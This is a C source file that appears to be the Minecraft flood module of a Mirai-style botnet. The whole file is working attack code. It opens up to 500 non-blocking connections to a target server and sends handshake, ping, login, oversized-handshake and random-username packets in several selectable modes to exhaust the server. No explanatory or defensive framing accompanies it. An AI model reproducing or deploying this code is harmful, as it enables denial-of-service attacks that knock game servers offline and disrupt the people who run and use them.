#define _GNU_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <poll.h>
#include <strings.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

#define MC_PROTO_VERSION 0x2F2
#define MC_MAX_CONNS 500

static int mc_varint_size(int v)
{
    int s = 0;
    do { s++; v >>= 7; } while (v);
    return s;
}

static int mc_write_varint(uint8_t *out, int v)
{
    int p = 0;
    while (v >= 0x80) { out[p++] = (v & 0x7F) | 0x80; v >>= 7; }
    out[p++] = v & 0x7F;
    return p;
}

static int mc_write_v(unsigned char *b, int v)
{
    int i = 0;
    do { b[i] = (v & 0x7F) | (v > 0x7F ? 0x80 : 0);
         v = (unsigned)v >> 7; i++; } while (v && i < 5);
    return i;
}

static void mc_build_packet(unsigned char *out, int *len, unsigned char id,
                             const unsigned char *payload, int plen)
{
    int pos = mc_write_varint(out, plen + 1);
    out[pos++] = id;
    if (payload && plen > 0) { util_memcpy(out + pos, payload, plen); pos += plen; }
    *len = pos;
}

static int mc_append_varint(unsigned char *buf, unsigned int value)
{
    int pos = 0;
    while ((value & 0xFFFFFF80) != 0) { buf[pos++] = (value & 0x7F) | 0x80; value >>= 7; }
    buf[pos++] = value & 0x7F;
    return pos;
}

static void mc_send_packet(int sock, unsigned char *data, int len)
{
    unsigned char lb[5];
    int lp = mc_append_varint(lb, len);
    send(sock, lb, lp, 0);
    send(sock, data, len, 0);
}

static void mc_send_handshake(int sock, int proto, const char *host, int hlen, unsigned short port, int ns)
{
    unsigned char pkt[1024];
    int pos = 0;
    pos += mc_write_v(pkt + pos, 0);
    pos += mc_write_v(pkt + pos, proto);
    pos += mc_write_v(pkt + pos, hlen);
    util_memcpy(pkt + pos, host, hlen); pos += hlen;
    {
        unsigned short np = htons(port);
        util_memcpy(pkt + pos, &np, 2); pos += 2;
    }
    pos += mc_write_v(pkt + pos, ns);
    mc_send_packet(sock, pkt, pos);
}

static void mc_send_ping(int sock, int64_t ts)
{
    unsigned char pkt[9];
    pkt[0] = 0x01;
    pkt[1] = (ts >> 56) & 0xFF; pkt[2] = (ts >> 48) & 0xFF;
    pkt[3] = (ts >> 40) & 0xFF; pkt[4] = (ts >> 32) & 0xFF;
    pkt[5] = (ts >> 24) & 0xFF; pkt[6] = (ts >> 16) & 0xFF;
    pkt[7] = (ts >> 8) & 0xFF;  pkt[8] = ts & 0xFF;
    mc_send_packet(sock, pkt, 9);
}

static void mc_generate_name(char *buf, int max)
{
    static const char cs[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
    int len = (rand_next() % 14) + 3;
    int i;
    if (len > max - 1) len = max - 1;
    for (i = 0; i < len; i++) buf[i] = cs[rand_next() % (sizeof(cs) - 1)];
    buf[len] = 0;
}

static void mc_generate_uuid(const char *name, unsigned char *out)
{
    unsigned int a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
    int len = util_strlen((char *)name);
    int i;
    for (i = 0; i < (len > 255 ? 255 : len); i++)
    {
        a ^= name[i] << ((i % 4) * 8);
        a = (a << 5) | (a >> 27); b ^= a;
        b = (b << 13) | (b >> 19); c += b;
        d ^= a + c;
    }
    b &= 0xFFFF0FFF; c &= 0x3FFFFFFF;
    out[0] = (a >> 24) & 0xFF; out[1] = (a >> 16) & 0xFF;
    out[2] = (a >> 8) & 0xFF;  out[3] = a & 0xFF;
    out[4] = (b >> 24) & 0xFF; out[5] = (b >> 16) & 0xFF;
    out[6] = ((b >> 8) & 0xFF) | 0x30; out[7] = b & 0xFF;
    out[8] = ((c >> 24) & 0xFF) | 0x80; out[9] = (c >> 16) & 0xFF;
    out[10] = (c >> 8) & 0xFF; out[11] = c & 0xFF;
    out[12] = (d >> 24) & 0xFF; out[13] = (d >> 16) & 0xFF;
    out[14] = (d >> 8) & 0xFF; out[15] = d & 0xFF;
}

static void mc_send_login(int sock, const char *user)
{
    unsigned char pkt[512];
    unsigned char uuid[16];
    int pos = 0;
    int ulen = util_strlen(user);
    pos += mc_write_v(pkt + pos, 0);
    pos += mc_write_v(pkt + pos, ulen);
    util_memcpy(pkt + pos, user, ulen); pos += ulen;
    mc_generate_uuid(user, uuid);
    pkt[pos++] = 0; pkt[pos++] = 1;
    util_memcpy(pkt + pos, uuid, 16); pos += 16;
    mc_send_packet(sock, pkt, pos);
}

static void mc_send_big_handshake(int sock, int payload_size)
{
    unsigned char *p;
    int pos = 0;
    int total = payload_size + 0x80;
    p = calloc(1, total);
    if (!p) return;
    pos += mc_write_v(p + pos, 0);
    pos += mc_write_v(p + pos, MC_PROTO_VERSION);
    pos += mc_write_v(p + pos, payload_size);
    {
        int i;
        for (i = 0; i < payload_size; i++)
            p[pos++] = 0x41;
    }
    p[pos++] = 0x99; p[pos++] = 0xDD;
    pos += mc_write_v(p + pos, 1);
    send(sock, p, pos, 0);
    free(p);
}

void attack_method_minecraft(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, j;
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 25565);
    char *mc_mode = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, "handshake");
    int atype = 1;
    struct sockaddr_in target_addr;
    int *socks;
    int *states;
    time_t end_time;
    int counter = 0;

    if (util_stristr(mc_mode, -1, "ping")) atype = 2;
    else if (util_stristr(mc_mode, -1, "login")) atype = 3;
    else if (util_stristr(mc_mode, -1, "bighandshake")) atype = 4;
    else if (util_stristr(mc_mode, -1, "pingjoin")) atype = 6;
    else if (util_stristr(mc_mode, -1, "longnames")) atype = 7;
    else if (util_stristr(mc_mode, -1, "socket")) atype = 8;

    socks = calloc(MC_MAX_CONNS, sizeof(int));
    states = calloc(MC_MAX_CONNS, sizeof(int));
    if (!socks || !states) { free(socks); free(states); return; }
    for (i = 0; i < MC_MAX_CONNS; i++) socks[i] = -1;

    end_time = time(NULL) + 2;
    {
        int min_dur = 2;
        (void)min_dur;
    }

    while (time(NULL) < end_time)
    {
        {
            int ti = rand_next() % targs_len;
            target_addr.sin_family = AF_INET;
            target_addr.sin_port = htons((uint16_t)dport);
            target_addr.sin_addr.s_addr = targs[ti].addr;

            for (i = 0; i < MC_MAX_CONNS; i++)
            {
                if (states[i] != 0) continue;
                {
                    int sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock < 0) continue;
                    {
                        int fl = fcntl(sock, F_GETFL, 0);
                        fcntl(sock, F_SETFL, fl | O_NONBLOCK);
                    }
                    connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
                    socks[i] = sock;
                    states[i] = 1;
                }
            }
        }

        {
            struct pollfd fds[MC_MAX_CONNS];
            int fc = 0;
            int fi[MC_MAX_CONNS];
            for (i = 0; i < MC_MAX_CONNS; i++)
            {
                if (states[i] == 1)
                {
                    fds[fc].fd = socks[i];
                    fds[fc].events = POLLOUT;
                    fi[fc] = i;
                    fc++;
                }
            }
            if (fc > 0) poll(fds, fc, 10);

            for (j = 0; j < fc; j++)
            {
                int idx = fi[j];
                if (fds[j].revents & POLLOUT)
                {
                    int err = 0;
                    socklen_t elen = sizeof(err);
                    getsockopt(socks[idx], SOL_SOCKET, SO_ERROR, &err, &elen);
                    if (err == 0) states[idx] = 2;
                    else { close(socks[idx]); socks[idx] = -1; states[idx] = 0; }
                }
            }
        }

        for (i = 0; i < MC_MAX_CONNS; i++)
        {
            int sock;
            char username[64];
            if (states[i] != 2) continue;
            sock = socks[i];

            if (atype == 8)
            {
                close(sock); socks[i] = -1; states[i] = 0;
                continue;
            }

            mc_send_handshake(sock, MC_PROTO_VERSION, inet_ntoa(target_addr.sin_addr),
                              util_strlen(inet_ntoa(target_addr.sin_addr)), (unsigned short)dport, 1);

            if (atype == 2 || atype == 6)
                mc_send_ping(sock, (int64_t)time(NULL));

            if (atype == 3 || atype == 7)
            {
                mc_generate_name(username, sizeof(username));
                mc_send_login(sock, username);
            }

            if (atype == 4)
                mc_send_big_handshake(sock, 1024);

            if (atype == 6)
            {
                unsigned char sr[] = {0x00};
                mc_send_packet(sock, sr, 1);
                mc_send_ping(sock, (int64_t)time(NULL));
                close(sock); socks[i] = -1; states[i] = 0;
                continue;
            }

            close(sock);
            socks[i] = -1;
            states[i] = 0;
            counter++;
        }
    }

    for (i = 0; i < MC_MAX_CONNS; i++)
        if (socks[i] != -1) close(socks[i]);
    free(socks);
    free(states);
}
